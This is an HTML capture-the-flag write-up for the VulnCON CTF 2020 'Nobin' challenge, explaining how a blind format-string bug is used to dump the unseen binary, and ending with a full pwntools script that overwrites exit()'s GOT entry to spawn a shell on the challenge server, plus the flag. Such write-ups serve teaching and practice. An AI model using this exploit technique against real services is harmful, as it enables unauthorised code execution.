@@ -1,0 +1,123 @@
+<!--Solve date: 12/19/2020-->
+
+<h1>VulnCON CTF 2020 - Nobin</h1>
+
+<h2>Binary Exploitation - 436 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>For this challenge, we are only given a netcat port. Notably, we are not given a binary to work with! Therefore, our first order of business is to find out what the program does. Typically, this process is called "fuzzing" and involves a bit of educated guesswork. For a CTF pwn challenge, common vulnerabilities are memory corruption induced by stack and heap overflows and abuse of format string. So, we should try payloads that follow these patterns.</p>
+
+<p>Quickly, we discover that the process is an echo service, just printing back what we enter. However, sending it a <code>printf()</code> format string, we get an interesting response:</p>
+
+<img class = "tiny" src = "./images/vulncon_nobin_1.png"/>
+
+<p>It appears that one vulnerability here is unprotected format string. In format string attacks, one very useful property that allows for a host of exploits is a self-referencing string. This refers to a format string located on the stack that is able to reference itself for contents. To test for this possibility, let's try to read a lot of arguments:</p>
+
+<img src = "./images/vulncon_nobin_2.png"/>
+
+<p>Recall that the <code>%p</code> specifier treats the argument as a <i>pointer</i>, which allows us to see entire 64-bit values (and it is clear from this output that this process is running on x64). The 6th argument has value 0x4847464544434241, which translated to ASCII characters, gives "ABCDEFGH" - this is exactly the beginning of our input! Since the order of arguments passed to functions in x64 is <code>rdi</code> (format string), <code>rsi</code> (arg1), <code>rdx</code> (arg2), <code>rcx</code> (arg3), <code>r8</code> (arg4), <code>r9</code> (arg5), and then stack arguments located above the return address, we can deduce that the buffer starts immediately above the <code>printf()</code> function frame.</p>
+
+<p>With this property, we can now read from and write to arbitrary memory. Since <code>rsi = 0x4008d4</code>, the program likely has PIE disabled (text base begins at <code>0x400000</code>), and we can now attempt to dump the program as-mapped in memory. Typical memory spaces even for small programs can be quite large, so we start by dumping 64 bytes of the ELF header, which should be mapped directly at <code>0x400000</code>. (See the exploit script below for the format string payload used to do this.)</p>
+
+<img class = "small" src = "./images/vulncon_nobin_3.png"/>
+
+<p class = "caption">Figure 1. ELF header of program mapped in memory.</p>
+
+<p>This ELF header is useful because among other details, it provides the entry point of the binary; i.e., where the program begins execution. Specifically, this is given by the dword value at offset <code>0x18</code>. For our binary, this would be <code>0x400670</code>, which seems reasonable. Now, we will dump 256 bytes at that entry point, expecting to see executable code. Indeed, dropping the dump into IDA, we are greeted with the standard entry we commonly see for ELFs.</p>
+
+<img class = "small" src = "./images/vulncon_nobin_4.png"/>
+
+<p class = "caption">Figure 2. Code at the entry point.</p>
+
+<p>From here, we can deduce where the entry point is, because we know that the call just before the <code>hlt</code> instruction is to <code>libc_start_main</code>, and arg0 passed in <code>rdi</code> is the address of <code>main()</code>. Here, we see that <code>main() = 0x400757</code>. This is what we will dump next.</p>
+
+<img class = "small" src = "./images/vulncon_nobin_5.png"/>
+
+<p class = "caption">Figure 3. Disassembly of <code>main()</code>.</p>
+
+<p>Although we are missing the name references for the library functions, we can use our intuition to deduce what the functions are. As with other pwn challenges, we see three calls at the beginning, each with four arguments: one is a pointer and the other three are small integers. These are likely <code>setvbuf()</code> calls. Next, we have a call with a single argument of 20. If we wait a while after connecting to the challenge and try to send text, we notice the process is closed. So, this second call is very likely <code>alarm(20)</code>. Next, there is a call with three arguments. The first is a stack address <code>rbp - 0x110</code> (that coincides with <code>rsp</code>!), the second is <code>0x100</code>, and the third is a pointer to <code>0x601070</code> (the same as the argument to the first <code>setvbuf()</code> call). This is very likely the call that reads  our input; i.e., <code>fgets(buf, 0x100, stdin)</code>. Finally, there is a call with two arguments, the first of which is our input and the second is <code>0x4008d4</code> - the same as the first leaked address we saw when we were fuzzing! So, this is <code>printf(buf, 0x4008d4)</code>, the vulnerability. At last, we likely have a call to <code>exit()</code> with code 0.</p>
+
+<p>Following <code>main()</code>, there is more code:</p>
+
+<img class = "small" src = "./images/vulncon_nobin_6.png"/>
+
+<p class = "caption">Figure 4. Function to spawn a shell, located right after <code>main()</code>.</p>
+
+<p>This code is obviously not executed under normal circumstances due to the <code>exit()</code> call right before it. However, if we can redirect execution here, then we can spawn a shell. To redirect code execution, we overwrite the GOT entry for <code>exit()</code> and replace it with <code>0x40081a</code> via a typical format string exploit. Thus, instead of exiting, we will run this additional code. In addition to overwriting GOT, however, we see that there is an additional comparison between the dword at <code>0x60108c</code> and <code>0x1337</code>, which is likely to prevent a blind bruteforce exploit. We can also use the format string to overwrite this address.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+def leakstack():
+    ret = []
+    for i in range(32):
+        p = remote("34.91.74.119", 49156)
+        p.sendline("%%%d$p" % (i + 1))
+        r = p.recvline()[: -1]
+        if r == b"(nil)":
+            ret.append(0)
+        else:
+            ret.append(int(r, 16))
+
+        p.close()
+
+    return ret
+
+def leakProgram(start, end, fileName):
+    prog = b''
+    with open(fileName, "wb") as f:
+        ip = start
+        while ip <= end:
+            p = remote("34.91.74.119", 49156)
+            p.sendline(b"%7$s\x00\x00\x00\x00" + p64(ip))
+            try:
+                r = p.recv()
+            except EOFError:
+                r = b''
+
+            ip += len(r) + 1
+            prog += r
+            prog += b'\x00'
+            p.close()
+
+        f.write(prog[: end - start])
+
+    return
+
+# finds that our fmtstring is on the stack at offset 6
+#stack = leakstack()
+#print('|'.join([hex(stacka) for stacka in stack]))
+
+# leaks the binary
+#leakProgram(0x400000, 0x400040, "./nobin_header")
+#leakProgram(0x400670, 0x400770, "./nobin_entry")
+#leakProgram(0x400757, 0x400957, "./nobin_main")
+#leakProgram(0x400660, 0x400670, "./nobin_exit")
+
+exit_got = 0x601048
+#target jump to 0x40081a
+target = 0x60108c
+
+p = remote("34.91.74.119", 49156)
+prefix = b"%1$26d%23$hhn%1$238d%24$hhn%1$56d%25$hhn%1$192d%26$hhn%27$hhn%28$hhn%29$hhn%30$hhn"
+prefix += b"%1$55d%31$hhn%1$220d%32$hhn%1$237d%33$hhn%34$hhn"
+prefix += (136 - len(prefix)) * b'\x00'
+postfix = p64(exit_got) + p64(exit_got + 1) + p64(exit_got + 2) + p64(exit_got + 3) + p64(exit_got + 4) + p64(exit_got + 5) + p64(exit_got + 6) + p64(exit_got + 7) + p64(target) + p64(target + 1) + p64(target + 2) + p64(target + 3)
+payload = prefix + postfix
+assert len(payload) < 0x100
+p.sendline(payload)
+
+p.interactive()    
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>vulncon{th4nk_y0u_%s_f0r_l34k}</code></p>
